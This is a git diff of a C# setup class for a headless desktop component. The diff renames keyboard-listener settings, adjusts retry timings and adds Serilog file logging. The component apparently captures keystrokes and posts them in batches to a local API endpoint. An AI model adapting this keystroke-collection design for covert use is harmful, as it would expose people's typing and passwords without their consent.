@@ -12,6 +12,9 @@ using EMS.Infrastructure.Common.Configurations.ListenersConfigs;
 using EMS.Infrastructure.Common.Providers;
 using EMS.Infrastructure.DependencyInjection;
 using EMS.Infrastructure.DependencyInjection.Interfaces;
+using Serilog;
+using Serilog.Formatting;
+using Serilog.Formatting.Json;
 
 namespace EMS.Desktop.Headless
 {
@@ -19,7 +22,6 @@ namespace EMS.Desktop.Headless
     {
         public IInjector RegisterDependencies(string jsonConfig)
         {
-
             var injector = UnityInjector.Instance;
 
             injector
@@ -29,18 +31,32 @@ namespace EMS.Desktop.Headless
                 .Register<IHttpClient, DefaultHttpClient>()
                 .RegisterInstance<KeyboardListenerConfig>(new KeyboardListenerConfig
                 {
-                    CapturedKeysThreshold = 20,
-                    DestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
-                    RetrySleepDurationsInMilliseconds = new List<int> { 1, 2, 3, 4, 5 },
-                    SendCapturedKeysTimerConfig = new TimerConfig
+                    SendCapturedItemsThreshold = 20,
+                    SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
+                    RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
+                    SendCapturedItemsTimerConfig = new TimerConfig
                     {
                         DueTime = 5000,
                         Period = 2000
                     }
                 })
-                .Register<IListener, KeyboardListener>(nameof(KeyboardListener),injector.Resolve<IHttpClient>(), injector.Resolve<IKeyboardApi>(), injector.Resolve<KeyboardListenerConfig>());
+                .Register<IListener, KeyboardListener>(nameof(KeyboardListener), injector.Resolve<IHttpClient>(), injector.Resolve<IKeyboardApi>(), injector.Resolve<KeyboardListenerConfig>());
+
+            this.RegisterSerilog();
 
             return injector;
+        }
+
+        private void RegisterSerilog()
+        {
+            var delimiter = Environment.NewLine;
+            var formatter = new JsonFormatter(closingDelimiter: delimiter);
+            var logsFilePath = @"..\..\Logs\Serilog.txt";
+
+            Log.Logger = new LoggerConfiguration()
+                .MinimumLevel.Debug()
+                .WriteTo.File(formatter, logsFilePath)
+                .CreateLogger();
         }
     }
 }
